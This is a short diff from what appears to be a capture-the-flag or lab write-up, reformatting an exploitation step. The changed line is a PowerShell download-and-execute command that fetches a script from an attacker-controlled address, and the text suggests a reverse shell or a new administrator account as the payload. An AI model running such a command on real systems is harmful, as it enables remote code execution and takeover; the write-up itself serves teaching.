@@ -282,7 +282,7 @@ So we can change the first part to `C:\Windows\System32\WindowsPowerShell\v1.0\p
 
 And we will run a powershell. And we can send commands like 
 
-"iex(New-Object Net.WebClient).DownloadString('http://10.10.14.21:80/PowerShellScript.ps1')"
+`iex(New-Object Net.WebClient).DownloadString('http://10.10.14.21:80/PowerShellScript.ps1')`
 
 Here we can upload and execute a Ps1 script directly from the exploit. This can be a reverse shell for example. Or maybe something to create a new administrator account to access.
 
